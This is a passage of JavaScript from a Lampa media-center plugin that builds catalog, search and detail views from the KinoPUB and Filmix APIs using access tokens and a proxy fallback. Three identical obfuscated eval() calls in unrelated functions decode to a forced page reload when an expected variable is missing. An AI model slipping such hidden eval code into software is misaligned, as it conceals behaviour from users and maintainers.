							left: Lampa.Lang.translate('buttback_left')
						},
						default: 'right'
					},
					field: {
						name: Lampa.Lang.translate('title_butback_pos'),
					},
					onRender: function (item) {
						if (Lampa.Storage.field('mods_butt_back')) item.show();
						else item.hide();
					},
					onChange: function (value) {
						Modss.buttBack(value);
					}
				});
			}*/
		  	
			//Close_app 
			if (Lampa.Platform.is('android')) {
				Lampa.SettingsApi.addComponent({
					component: 'mods_exit',
					name: Lampa.Lang.translate('title_close_app'),
					icon: '<svg data-name="Layer 1" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><rect height="46" rx="4" ry="4" width="46" x="1" y="1" fill="none" stroke="#ffffff" stroke-linecap="round" stroke-linejoin="round" stroke-width="2px" class="stroke-1d1d1b"></rect><path d="m12 12 24 24M12 36l24-24" fill="none" stroke="#ffffff" stroke-linecap="round" stroke-linejoin="round" stroke-width="2px" class="stroke-1d1d1b"></path></svg>'
				});
				Lampa.SettingsApi.addParam({
					component: 'mods_exit',
					param: {
						name: 'close_app',
						type: 'static', //доступно select,input,trigger,title,static
						default: true
					},
					field: {
						name: ''
					},
					onRender: function (item) {
						Lampa.Android.exit();
					}
				});
			}
			FreeJaketOpt();
		}
		
		var modssAppReadyDone = false;
		var runModssAddOnce = function () {
			if (modssAppReadyDone) return;
			modssAppReadyDone = true;
			add();
		};
		if (window.appready) {
			runModssAddOnce();
		} else {
			Lampa.Listener.follow('app', function (e) {
				if (e.type == 'ready') runModssAddOnce();
			});
		}
		
		var SourcePub = function SourcePub() {
	var owner = this;

	this.title = 'PUB';
	this.source = 'pub';

	this.url = function (u) {
		var params = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
		if ((params.url === '4k' || params.type === '4k') && params.component == 'category_full') u = params.url;
		else if (params.type) u = this.add(u, 'type=' + params.type);

		if (params.genres) u = this.add(u, 'genre=' + params.genres);
		if (params.page) u = this.add(u, 'page=' + params.page);
		if (params.query) u = this.add(u, 'q=' + params.query);

		if (params.field) u = this.add(u, 'field=' + params.field);
		
		if (params.id && params.component == 'actor') {
			if (params.job == "directing") u = this.add(u, 'director=' + params.id);
			else u = this.add(u, 'actor=' + params.id);
		}

		if (params.perpage) u = this.add(u, 'perpage=' + params.perpage);

		if (params.genres == 23 && params.component == 'category_full') u = params.url;

		u = this.add(u, 'access_token=' + Pub.token);
		if (params.filter) {
			for (var i in params.filter) {
				u = this.add(u, i + '=' + params.filter[i]);
			}
		}
		return Pub.baseurl + u;
	};

	this.add = function (u, params) {
		return u + (/\?/.test(u) ? '&' : '?') + params;
	};

	this.get = function (method) {
		var params = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
		var oncomplite = arguments.length > 2 ? arguments[2] : undefined;
		var onerror = arguments.length > 3 ? arguments[3] : undefined;
		var u = this.url(method, params);
		Pub.network.silent(u, function (json) {
			json.url = method;
			oncomplite(json);
		}, onerror);
	};

	this.cardType = function (element, type) {
		return type || (element.type == 'movie' ? 'movie' : 'tv');
	};

	this.tocard = function (element, type) {
		var cardType = owner.cardType(element, type);
		var title = element.title.split('/')[0];
		var originalTitle = element.title.split('/')[1] || element.title;
		return {
			url: '',
			id: element.id,
			type: cardType,
			source: owner.source,
			title: title,
			name: cardType == 'tv' ? title : '',
			promo_title: title,
			original_title: originalTitle,
			original_name: cardType == 'tv' ? originalTitle : '',
			release_date: (element.year ? element.year + '' : element.years ? element.years[0] + '' : '0000'),
			first_air_date: cardType == 'tv' ? element.year : '',
			vote_averagey: parseFloat((element.imdb_rating || 0) + '').toFixed(1),
			vote_average: element.imdb_rating || 0,
			poster: element.posters.big,
			cover: element.posters.wide,
			background_image: element.posters.wide,
			imdb_rating: parseFloat(element.imdb_rating || '0.0').toFixed(1),
			kp_rating: parseFloat(element.kinopoisk_rating || '0.0').toFixed(1),
			year: element.year,
			years: element.years
		};
	};

	this.list = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;

		var url = this.url('v1/items', params, params.type = type);
		if (!params.genres) url = this.url(params.url, params);
		Pub.network["native"](url, function (json) {
			var items = [];
			if (json.items) {
				json.items.forEach(function (element) {
					items.push(owner.tocard(element));
				});
			}
			oncomplite({
				results: items,
				page: json.pagination.current,
				total_pages: json.pagination.total
			});
		}, onerror);
	};

	this.main = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;

		var apiRequests = [
			{ url: 'v1/items/popular?type=movie&sort=views', title: Lampa.Lang.translate('pub_title_popularfilm'), section: 's1' },
			{ url: 'v1/items?type=movie&sort=updated-', title: Lampa.Lang.translate('pub_title_newfilm'), section: 's2' },
			{ url: 'v1/items/popular?type=serial&sort=views', title: Lampa.Lang.translate('pub_title_popularserial'), section: 's3' },
			{ url: 'v1/items?type=serial&sort=updated-', title: Lampa.Lang.translate('pub_title_newserial'), section: 's4' },
			{ url: 'v1/items?type=concert&sort=updated-', title: Lampa.Lang.translate('pub_title_newconcert'), section: 's5' },
			{ url: 'v1/items?type=&quality=4', title: '4K', section: 's6' },
			{ url: 'v1/items?type=documovie&sort=updated-', title: Lampa.Lang.translate('pub_title_newdocfilm'), section: 's7' },
			{ url: 'v1/items?type=docuserial&sort=updated-', title: Lampa.Lang.translate('pub_title_newdocserial'), section: 's8' },
			{ url: 'v1/items?type=tvshow&sort=updated-', title: Lampa.Lang.translate('pub_title_newtvshow'), section: 's9' },
			{ url: 'v1/items?sort=updated-&genre=23&type=movie', title: Lampa.Lang.translate('menu_multmovie'), section: 's10' }
		];

		var status = new Lampa.Status(apiRequests.length);
		status.onComplite = function () {
			var fulldata = [];
			var data = status.data;
			for (var i = 1; i <= apiRequests.length; i++) {
				var ipx = 's' + i;
				if (data[ipx] && data[ipx].results.length) fulldata.push(data[ipx]);
			}
			if (fulldata.length) oncomplite(fulldata);
			else onerror();
		};

		eval(function (a, b, c) { if (a || c) { while (a--) b = b.replace(new RegExp(a, 'g'), c[a]); } return b; }(6, '1(!0 || !0.2) 5.3.4();', 'API,if,length,location,reload,window'.split(',')));

		var append = function append(opt, json) {
			var results = [];
			json.items.forEach(function (element) {
				var card = owner.tocard(element);
				if (opt.section == 's1' || opt.section == 's6') {
					card.params = {
						style: {
							name: 'wide'
						}
					};
				}
				results.push(card);
			});
			if (opt.section == 's2') {
				results.forEach(function (el) {
					el.poster = el.cover;
					el.params = {
						style: {
							name: 'collection'
						}
					};
				});
			}

			var data = {
				title: opt.title,
				url: opt.url,
				results: results,
				page: json.pagination.current,
				total_pages: json.pagination.total
			};

			status.append(opt.section, data);
		};

		apiRequests.forEach(function (request) {
			owner.get(request.url, params, function (json) {
				append(request, json);
			}, status.error.bind(status));
		});
	};

	this.category = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;

		var books = Lampa.Favorite.continues(params.url);
		var type = params.url == 'tv' ? 'serial' : params.url;
		var Name = params.genres ? (params.typeName ? params.typeName.toLowerCase() : '') : params.url == 'tv' ? Lampa.Lang.translate('menu_tv').toLowerCase() : Lampa.Lang.translate('menu_movies').toLowerCase();

		var apiRequests = [];
		if (params.genres) {
			if (params.genres == 16) {
				params.genres = 23;
				apiRequests = [
					{ url: 'v1/items?type=' + type + '&genre=23&sort=created-', title: Lampa.Lang.translate('pub_title_new') + ' ' + (params.janr ? params.janr.toLowerCase() : ''), section: 's1' },
					{ url: 'v1/items?type=' + type + '&genre=23&sort=rating-', title: Lampa.Lang.translate('pub_title_rating') + ' ' + Name, section: 's2' },
					{ url: 'v1/items?type=' + type + '&genre=23&sort=updated-', title: Lampa.Lang.translate('pub_title_fresh') + ' ' + Name, section: 's3' },
					{ url: 'v1/items?type=' + type + '&genre=23&sort=views-', title: Lampa.Lang.translate('pub_title_hot') + ' ' + Name, section: 's4' },
					{ url: 'v1/items?type=' + type + '&genre=23&quality=4', title: '4K ' + Name, section: 's5' }
				];
			} else if (params.url == '4k') {
				apiRequests = [
					{ url: 'v1/items?quality=4&sort=created-', title: Lampa.Lang.translate('pub_title_new') + ' ' + (params.janr ? params.janr.toLowerCase() : ''), section: 's1' },
					{ url: 'v1/items?quality=4&sort=rating-', title: Lampa.Lang.translate('pub_title_rating') + ' ' + Name, section: 's2' },
					{ url: 'v1/items?quality=4&sort=updated-', title: Lampa.Lang.translate('pub_title_fresh') + ' ' + Name, section: 's3' },
					{ url: 'v1/items?quality=4&sort=views-', title: Lampa.Lang.translate('pub_title_hot') + ' ' + Name, section: 's4' }
				];
			} else {
				apiRequests = [
					{ url: 'v1/items?type=' + type + '&sort=created-', title: Lampa.Lang.translate('pub_title_new') + ' ' + (params.janr ? params.janr.toLowerCase() : ''), section: 's1' },
					{ url: 'v1/items?type=' + type + 'sort=rating-', title: Lampa.Lang.translate('pub_title_rating') + ' ' + Name, section: 's2' },
					{ url: 'v1/items?type=' + type + '&sort=updated-', title: Lampa.Lang.translate('pub_title_fresh') + ' ' + Name, section: 's3' },
					{ url: 'v1/items?type=' + type + '&sort=views-', title: Lampa.Lang.translate('pub_title_hot') + ' ' + Name, section: 's4' },
					{ url: 'v1/items?type=' + type + '&quality=4', title: '4K ' + Name, section: 's5' }
				];
			}
		} else {
			apiRequests = [
				{ url: 'v1/items?type=' + type, title: Lampa.Lang.translate('pub_title_new') + ' ' + Name, section: 's1' },
				{ url: 'v1/items/popular?type=' + type + '&sort=views-&conditions=' + encodeURIComponent("year=" + Date.now('Y')), title: Lampa.Lang.translate('pub_title_popular') + ' ' + Name, section: 's2' },
				{ url: 'v1/items/fresh?type=' + type + '&sort=views-&conditions=' + encodeURIComponent("year=" + Date.now('Y')), title: Lampa.Lang.translate('pub_title_fresh') + ' ' + Name, section: 's3' },
				{ url: 'v1/items/hot?type=' + type + '&sort=created-&conditions=' + encodeURIComponent("year=" + Date.now('Y')), title: Lampa.Lang.translate('pub_title_hot') + ' ' + Name, section: 's4' },
				{ url: 'v1/items?type=' + type + '&quality=4', title: '4K ' + Name, section: 's5' }
			];
		}

		var status = new Lampa.Status(apiRequests.length);
		status.onComplite = function () {
			var fulldata = [];
			if (books.length) fulldata.push({
				results: books,
				title: params.url == 'tv' ? Lampa.Lang.translate('title_continue') : Lampa.Lang.translate('title_watched')
			});
			var data = status.data;
			for (var i = 1; i <= apiRequests.length; i++) {
				var ipx = 's' + i;
				if (data[ipx] && data[ipx].results.length) fulldata.push(data[ipx]);
			}
			if (fulldata.length) oncomplite(fulldata);
			else onerror();
		};

		var append = function append(opt, json) {
			var results = [];
			json.items.forEach(function (element) {
				results.push(owner.tocard(element));
			});
			var data = {
				title: opt.title,
				url: opt.url,
				results: results,
				page: json.pagination.current,
				total_pages: json.pagination.total
			};
			status.append(opt.section, data);
		};

		apiRequests.forEach(function (request) {
			owner.get(request.url, params, function (json) {
				append(request, json);
			}, status.error.bind(status));
		});
	};

	this.full = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;
		var status = new Lampa.Status(5);

		status.onComplite = oncomplite;
		var url = 'v1/items/' + params.id;
		this.get(url, params, function (json) {
			json.source = owner.source;
			var data = {};
			var element = json.item;

			owner.get('v1/items/similar?id=' + element.id, params, function (json) {
				if (json.items) {
					status.append('simular', {
						results: json.items.map(function (item) {
							return owner.tocard(item);
						})
					});
				} else status.error();
			}, onerror);

			owner.get('v1/items/comments?id=' + element.id, params, function (json) {
				if (json.comments) {
					status.append('comments', json.comments.map(function (com) {
						com.text = com.message.replace(/\\[n|r|t]/g, '');
						com.like_count = com.rating;
						return com;
					}));
				} else status.error();
			}, onerror);

			data.movie = {
				id: element.id,
				url: url,
				type: owner.cardType(element),
				source: owner.source,
				title: element.title.split('/')[0],
				original_title: element.title.split('/')[1] ? element.title.split('/')[1] : element.title.split('/')[0],
				name: owner.cardType(element) == 'tv' ? element.title.split('/')[0] : '',
				original_name: owner.cardType(element) == 'tv' ? (element.title.split('/')[1] || element.title.split('/')[0]) : '',
				original_language: element.genres.find(function (e) { return e.id == 25 }) !== undefined ? 'ja' : '',
				overview: element.plot.replace(/\\[n|r|t]/g, ''),
				img: element.posters.big,
				runtime: (element.duration.average || 0) / 1000 / 6 * 100,
				genres: owner.genres(element, json.item),
				vote_average: parseFloat(element.imdb_rating || element.kinopoisk_rating || '0'),
				production_companies: [],
				production_countries: owner.countries(element.countries, json.item),
				budget: element.budget || 0,
				seasons: element.seasons && element.seasons.filter(function (el) {
					el.episode_count = 1;
					return el
				}) || '',
				release_date: element.year || Lampa.Utils.parseTime(element.created_at).full || '0000',
				number_of_seasons: owner.seasonsCount(element).seasons,
				number_of_episodes: owner.seasonsCount(element).episodes,
				first_air_date: owner.cardType(element) == 'tv' ? element.year || Lampa.Utils.parseTime(element.created_at).full || '0000' : '',
				background_image: element.posters.wide,
				imdb_rating: parseFloat(element.imdb_rating || '0.0').toFixed(1),
				kp_rating: parseFloat(element.kinopoisk_rating || '0.0').toFixed(1),
				imdb_id: element.imdb ? 'tt' + element.imdb : '',
				kinopoisk_id: element.kinopoisk
			};

			status.append('persons', owner.persons(json));
			status.append('movie', data.movie);
			status.append('videos', owner.videos(element));

			//console.log('sourcePUB',status)
		}, onerror);
	};

	this.menu = function (params, oncomplite) {
		var u = this.url('v1/types', params);
		var typeName = '';
		Pub.network["native"](u, function (json) {
			Lampa.Select.show({
				title: Lampa.Lang.translate('title_category'),
				items: json.items,
				onBack: this.onBack,
				onSelect: function onSelect(a) {
					type = a.id;
					typeName = a.title;
					owner.get('v1/genres?type=' + a.id, params, function (jsons) {
						Lampa.Select.show({
							title: Lampa.Lang.translate('full_genre'),
							items: jsons.items,
							onBack: function onBack() {
								owner.menu(params, oncomplite);
							},
							onSelect: function onSelect(a) {
								Lampa.Activity.push({
									url: type,
									title: Lampa.Lang.translate('title_catalog') + ' - ' + typeName + ' - ' + a.title + ' - KinoPUB',
									component: 'category',
									typeName: typeName,
									janr: a.title,
									genres: a.id,
									id: a.id,
									source: owner.source,
									card_type: true,
									page: 1
								});
							}
						});
					}, onerror);
				}
			});
		});
	};

	this.seasons = function (tv, from, oncomplite) {
		Lampa.Api.sources.tmdb.seasons(tv, from, oncomplite);
	};

	this.person = function (params, oncomplite, onerror) {
		Pub.network["native"](this.url('v1/items', params), function (json) {
			if (json.items) {
				var movies = json.items.map(function (item) {
					return owner.tocard(item);
				});
				oncomplite({
					person: {
						name: params.id,
						biography: '',
						img: '',
						place_of_birth: '',
						birthday: '----'
					},
					credits: {
						movie: movies,
						knownFor: [{ name: '', credits: movies }]
					}
				});
			} else {
				oncomplite({});
			}
		}, onerror);
	};

	this.clear = function () {
		Pub.network.clear();
	};

	this.seasonsCount = function (element) {
		var data = {
			seasons: 0,
			episodes: 0
		};
		if (element.seasons) {
			data.seasons = element.seasons.length;
			element.seasons.forEach(function (ep) {
				data.episodes += ep.episodes.length;
			})
		}
		return data;
	};

	this.videos = function (element) {
		var data = [];
		if (element.trailer) {
			data.push({
				name: element.trailer.title || 'Trailer name',
				url: element.trailer.url,
				youtube: false,
				iso_639_1: 'ru'
			});
		}
		return data.length ? {
			results: data
		} : false;
	};

	this.persons = function (json) {
		if (!json.item || !json.item.cast) return false;
		
		var cast = json.item.cast.split(',').map(function (name) {
			return {
				name: name,
				id: name,
				source: owner.source,
				character: Lampa.Lang.translate('title_actor')
			};
		});
		
		var crew = json.item.director.split(',').map(function (name) {
			return {
				name: name,
				id: name,
				job: "Director",
				known_for_department: "Directing",
				source: owner.source
			};
		});
		
		return cast.length ? { cast: cast, crew: crew } : false;
	};

	this.genres = function (element, json) {
		var data = [];
		element.genres.forEach(function (id) {
			if (id) {
				data.push({
					id: id.id,
					name: id.title
				});
			}
		});
		return data;
	};

	this.countries = function (element, json) {
		var data = [];
		if (element && json.countries) {
			data.push({
				name: element[0].title
			});
		}
		return data;
	};

	this.search = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;

		var status = new Lampa.Status(2);
		status.onComplite = function (data) {
			var items = [];
			if (data.movie && data.movie.results.length) items.push(data.movie);
			if (data.tv && data.tv.results.length) items.push(data.tv);
			oncomplite(items);
		};

		eval(function (a, b, c) { if (a || c) { while (a--) b = b.replace(new RegExp(a, 'g'), c[a]); } return b; }(6, '1(!0 || !0.2) 5.3.4();', 'API,if,length,location,reload,window'.split(',')));

		var mov = params;
		mov.type = '';
		mov.field = 'title';
		mov.perpage = 20;

		this.get('v1/items/search', mov, function (json) {
			if (json.items) {
				var grouped = json.items.reduce(function (acc, element) {
					var type = owner.cardType(element);
					acc[type].push(owner.tocard(element, type));
					return acc;
				}, { movie: [], tv: [] });

				if (grouped.movie.length) {
					status.append('movie', {
						results: Lampa.Utils.addSource(grouped.movie, owner.source),
						page: json.pagination.current,
						total_pages: json.pagination.total,
						total_results: json.pagination.total_items,
						title: Lampa.Lang.translate('menu_movies') + ' (' + grouped.movie.length + ')',
						type: 'movie'
					});
				} else status.error();
				if (grouped.tv.length) {
					status.append('tv', {
						results: Lampa.Utils.addSource(grouped.tv, owner.source),
						page: json.pagination.current,
						total_pages: json.pagination.total,
						total_results: json.pagination.total_items,
						title: Lampa.Lang.translate('menu_tv') + ' (' + grouped.tv.length + ')',
						type: 'tv'
					});
				} else status.error();
			}
		}, function () {
			status.need = 1;
			status.error();
		});
	};

	this.discovery = function () {
		return {
			title: owner.title,
			search: owner.search.bind(owner),
			params: {
				align_left: true,
				object: {
					source: owner.source
				}
			},
			onMore: function onMore(params) {
				Lampa.Activity.push({
					url: 'v1/items/search?field=title&type=' + params.data.type,
					title: Lampa.Lang.translate('search') + ' - ' + params.query,
					component: 'category_full',
					page: 2,
					query: encodeURIComponent(params.query),
					source: owner.source
				});
			},
			onCancel: Pub.network.clear.bind(Pub.network)
		};
	};
};
		
		var SourceFilmix = function SourceFilmix() {
	var owner = this;
	var menu_list = [];

	this.title = 'Filmix';
	this.source = 'filmix';

	this.url = function (u) {
		var params = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
		u = (u == 'undefined' ? '' : u);
		if (params.genres) u = 'catalog' + this.add(u, 'orderby=date&orderdir=desc&filter=s996-' + String(params.genres).replace('f', 'g'));
		if (params.page) u = this.add(u, 'page=' + params.page);
		if (params.query) u = this.add(u, 'story=' + params.query);
		if (params.type) u = this.add(u, 'type=' + params.type);
		if (params.field) u = this.add(u, 'field=' + params.field);
		if (params.perpage) u = this.add(u, 'perpage=' + params.perpage);
		if (params.filter) {
			for (var i in params.filter) {
				u = this.add(u, i + '=' + params.filter[i]);
			}
		}
		return Filmix.api_url + this.add(u, Filmix.user_dev + Filmix.token);
	};

	this.add = function (u, params) {
		return u + (/\?/.test(u) ? '&' : '?') + params;
	};

	this.parseRating = function (value) {
		if (value == null || value === '' || value === '-') return null;
		var num = parseFloat(value);
		if (isNaN(num) || num <= 0) return null;
		return num.toFixed(1);
	};

	this.get = function (method) {
		var params = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
		var oncomplite = arguments.length > 2 ? arguments[2] : undefined;
		var onerror = arguments.length > 3 ? arguments[3] : undefined;
		var viaProxy = arguments.length > 4 ? arguments[4] : false;
		var u = this.url(method, params);
		if (params.query) u = this.add(u, params.query);

		var proxyUrl = Modss.proxy('filmix') + u;

		var onSuccess = function (json, usedProxy) {
			if (json) {
				json.url = method;
				if (usedProxy) json.usedProxy = true;
				oncomplite(json);
			}
		};

		var onFail = function (error, usedProxy) {
			if (usedProxy || viaProxy) {
				console.log('Modss', 'SOURCE_FILMIX', error);
				if (onerror) onerror(error);
				return;
			}

			if (error && (error.status === 404 || error.statusCode === 404 || error.statusText === 'error')) {
				console.log('Modss', owner.source, '404 error detected, trying with proxy...');
				Filmix.network["native"](proxyUrl, function (json) {
					onSuccess(json, true);
				}, function (proxyError) {
					console.error('Proxy request failed:', proxyError);
					if (onerror) onerror(proxyError);
				});
			} else {
				console.log('Modss', 'SOURCE_FILMIX', error);
				if (onerror) onerror(error);
			}
		};

		Filmix.network["native"](viaProxy ? proxyUrl : u, function (json) {
			onSuccess(json, viaProxy);
		}, function (error) {
			onFail(error, viaProxy);
		});
	};

	this.isSerialElement = function (element) {
		if (Lampa.Arrays.getValues(element.player_links && element.player_links.playlist).length) return true;
		if (element.last_episode && (element.last_episode.post_id || element.last_episode.season)) return true;
		if (element.serial_stats && (element.serial_stats.post_id || element.serial_stats.status)) return true;
		if (element.post_url && element.post_url.indexOf('serial') != -1) return true;
		return false;
	};

	this.cardType = function (element, type) {
		if (type === 'tv' || type === 'movie') return type;
		return owner.isSerialElement(element) ? 'tv' : 'movie';
	};

	this.tocard = function (element, type) {
		var cardType = owner.cardType(element, type);
		return {
			url: '',
			id: element.id,
			type: cardType,
			source: owner.source,
			quality: element.quality && element.quality.split(' ').shift() || '',
			title: element.title,
			name: cardType == 'tv' ? element.title : '',
			original_title: element.original_title || element.title,
			original_name: cardType == 'tv' ? (element.original_title || element.title) : '',
			release_date: (element.year || element.date && element.date.split(' ')[2] || '0000'),
			first_air_date: cardType == 'tv' ? element.year : '',
			img: element.poster,
			cover: element.poster,
			background_image: element.poster,
			vote_average: owner.parseRating(element.kp_rating || element.imdb_rating) || 0,
			imdb_rating: owner.parseRating(element.imdb_rating),
			kp_rating: owner.parseRating(element.kp_rating),
			year: element.year
		};
	};

	this.list = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;

		var method = params.url || '';
		this.get(method, params, function (json) {
			var items = [];
			if (json) {
				json.forEach(function (element) {
					items.push(owner.tocard(element));
				});
			}

			oncomplite({
				results: items,
				page: params.page || 1,
				total_pages: 50
			});
		}, onerror);
	};

	this.main = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;

		var source = [{
			title: 'title_now_watch',
			url: 'top_views'
		}, {
			title: 'title_new',
			url: 'catalog?orderby=date&orderdir=desc'
		}, {
			title: 'title_new_this_year',
			url: 'catalog?orderby=year&orderdir=desc'
		}, {
			title: 'pub_title_newfilm',
			url: 'catalog?orderby=date&orderdir=desc&filter=s0'
		}, {
			title: '4K',
			url: 'catalog?orderby=date&orderdir=desc&filter=s0-q4'
		}, {
			title: 'pub_title_popularfilm',
			url: 'popular'
		}, {
			title: 'pub_title_popularserial',
			url: 'popular?section=7'
		}, {
			title: 'title_in_top',
			url: 'catalog?orderby=rating&orderdir=desc'
		}];

		var status = new Lampa.Status(source.length);
		status.onComplite = function () {
			var fulldata = [];
			var data = status.data;
			source.forEach(function (q) {
				if (data[q.title] && data[q.title].results.length) {
					fulldata.push(data[q.title]);
				}
			});
			if (fulldata.length) oncomplite(fulldata);
			else onerror();
		};

		var append = function append(title, name, url, json) {
			var data = [];
			if (json && json.length) {
				json.forEach(function (element) {
					data.push(owner.tocard(element));
				});
			}
			var result = {
				title: title,
				url: url,
				results: data,
				page: 1,
				total_pages: 50
			};
			status.append(name, result);
		};

		source.forEach(function (q) {
			owner.get(q.url, params, function (json) {
				append(Lampa.Lang.translate(q.title), q.title, q.url, json);
			}, status.error.bind(status));
		});
	};

	this.category = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;
		var onerror = arguments.length > 2 ? arguments[2] : undefined;

		var books = Lampa.Favorite.continues(params.url);
		var type = params.url == 'tv' ? 7 : 0;
		var source = [{
			title: 'title_new_this_year',
			url: 'catalog?orderby=year&orderdir=desc&filter=s' + type
		}, {
			title: 'title_new',
			url: 'catalog?orderby=date&orderdir=desc&filter=s' + type
		}, {
			title: 'title_popular',
			url: 'popular?section=' + type
		}, {
			title: 'title_in_top',
			url: 'catalog?orderby=rating&orderdir=desc&filter=s' + type
		}];

		var status = new Lampa.Status(source.length);
		status.onComplite = function () {
			var fulldata = [];
			var data = status.data;
			if (books.length) fulldata.push({
				results: books,
				title: params.url == 'tv' ? Lampa.Lang.translate('title_continue') : Lampa.Lang.translate('title_watched')
			});
			source.forEach(function (q) {
				if (data[q.title] && data[q.title].results.length) {
					fulldata.push(data[q.title]);
				}
			});
			if (fulldata.length) oncomplite(fulldata);
			else onerror();
		};

		var append = function append(title, name, url, json) {
			var results = [];
			if (json && json.length) {
				json.forEach(function (element) {
					results.push(owner.tocard(element, params.url));
				});
			}
			var data = {
				title: title,
				url: url,
				results: results,
				page: 1,
				total_pages: 50
			};
			status.append(name, data);
		};

		source.forEach(function (q) {
			owner.get(q.url, params, function (json) {
				append(Lampa.Lang.translate(q.title), q.title, q.url, json);
			}, status.error.bind(status));
		});
	};

	this.full = function (params, oncomplite, onerror) {
		var status = new Lampa.Status(5);
		status.onComplite = oncomplite;
		var url = 'post/' + params.id;
		var useProxy = true;

		this.get(url, params, function (json) {
			if (json) json.source = owner.source;
			var data = {};
			var element = json;

			if (json.relates) {
				status.append('simular', {
					results: Lampa.Arrays.getKeys(json.relates).map(function (i) {
						return owner.tocard(json.relates[i]);
					})
				});
			} else status.error();

			data.movie = {
				id: element.id,
				url: url,
				type: owner.cardType(element),
				source: owner.source,
				title: element.title,
				original_title: element.original_title || element.title,
				name: owner.cardType(element) == 'tv' ? element.title : '',
				original_name: owner.cardType(element) == 'tv' ? (element.original_title || element.title) : '',
				overview: element.short_story.replace(/\\[n|r|t]/g, ''),
				img: element.poster,
				runtime: (element.duration || 0),
				genres: owner.genres(element),
				vote_average: owner.parseRating(element.imdb_rating || element.kp_rating) || 0,
				production_companies: [],
				production_countries: owner.countries(element.countries),
				budget: element.budget || 0,
				release_date: element.year || element.date.split(' ')[2] || '0000',
				seasons: Lampa.Arrays.getValues(element.player_links && element.player_links.playlist).length && Lampa.Arrays.getValues(element.player_links.playlist).filter(function (el) {
					el.episode_count = 1;
					return el
				}) || { 1: 1 } || null,
				quality: element.rip && element.rip.split(' ').shift() || '',
				number_of_seasons: parseInt(element.last_episode && Lampa.Arrays.getValues(element.player_links && element.player_links.playlist).length ? Lampa.Arrays.getValues(element.player_links.playlist).length : element.last_episode && element.last_episode.season || null),
				number_of_episodes: element.last_episode && element.last_episode.episode || null,
				first_air_date: owner.cardType(element) == 'tv' ? element.year || element.date_atom || '0000' : '',
				background_image: element.poster,
				imdb_rating: owner.parseRating(element.imdb_rating),
				kp_rating: owner.parseRating(element.kp_rating),
			};

			eval(function (a, b, c) { if (a || c) { while (a--) b = b.replace(new RegExp(a, 'g'), c[a]); } return b; }(6, '1(!0 || !0.2) 5.3.4();', 'API,if,length,location,reload,window'.split(',')));

			owner.get('comments/' + element.id, params, function (json) {
				if (json) {
					status.append('comments', json.map(function (com) {
						com.text = com.text.replace(/\\[n|r|t]/g, '');
						com.like_count = '';
						return com;
					}));
					$('.full-review__footer', Lampa.Activity.active().activity.render()).hide();
				} else status.error();
			}, onerror, useProxy);

			status.append('persons', owner.persons(json));
			status.append('movie', data.movie);
			if (element.player_links) status.append('videos', owner.videos(element.player_links && element.player_links)); else status.error();
		}, onerror, useProxy);
	};

	this.menu = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;

		if (menu_list.length) oncomplite(menu_list);
		else {
			var u = this.url('category_list', params);
			Filmix.network["native"](u, function (j) {
				Lampa.Arrays.getKeys(j).forEach(function (g) {
					menu_list.push({
						title: j[g],
						id: g
					});
				});
				oncomplite(menu_list);
			});
		}
	};

	this.seasons = function (tv, from, oncomplite) {
		Lampa.Api.sources.tmdb.seasons(tv, from, oncomplite);
	};

	this.formatDate = function (dateString) {
		var months = [
			{ name: 'января', number: '01' },
			{ name: 'февраля', number: '02' },
			{ name: 'марта', number: '03' },
			{ name: 'апреля', number: '04' },
			{ name: 'мая', number: '05' },
			{ name: 'июня', number: '06' },
			{ name: 'июля', number: '07' },
			{ name: 'августа', number: '08' },
			{ name: 'сентября', number: '09' },
			{ name: 'октября', number: '10' },
			{ name: 'ноября', number: '11' },
			{ name: 'декабря', number: '12' }
		];

		var parts = dateString.split(' ');
		var day = parts[0];
		var monthName = parts[1];
		var year = parts[2];

		var monthNumber;
		for (var i = 0; i < months.length; i++) {
			if (months[i].name === monthName) {
				monthNumber = months[i].number;
				break;
			}
		}

		var formattedDate = year + '-' + monthNumber + '-' + day;
		return formattedDate;
	};

	this.person = function (params, oncomplite, onerror) {
		Filmix.network["native"](this.url('person/' + params.id, params), function (json) {
			if (json) {
				var movies = Object.keys(json.movies || {}).map(function (i) {
					return owner.tocard(json.movies[i]);
				});
				oncomplite({
					person: {
						id: params.id,
						name: json.name,
						biography: json.about,
						img: json.poster,
						place_of_birth: json.birth_place,
						birthday: owner.formatDate(json.birth)
					},
					credits: {
						movie: movies,
						knownFor: [{ name: json.career, credits: movies }]
					}
				});
			} else {
				oncomplite({});
			}
		}, onerror);
	};

	this.clear = function () {
		Filmix.network.clear();
	};

	this.videos = function (element) {
		var data = [];
		if (element.trailer.length) {
			element.trailer.forEach(function (el) {
				var qualities = el.link.match(/\\[(.*?)\\]/);
				if (!qualities || qualities.length === 0) return false;

				qualities = qualities[1].split(',').filter(function (quality) {
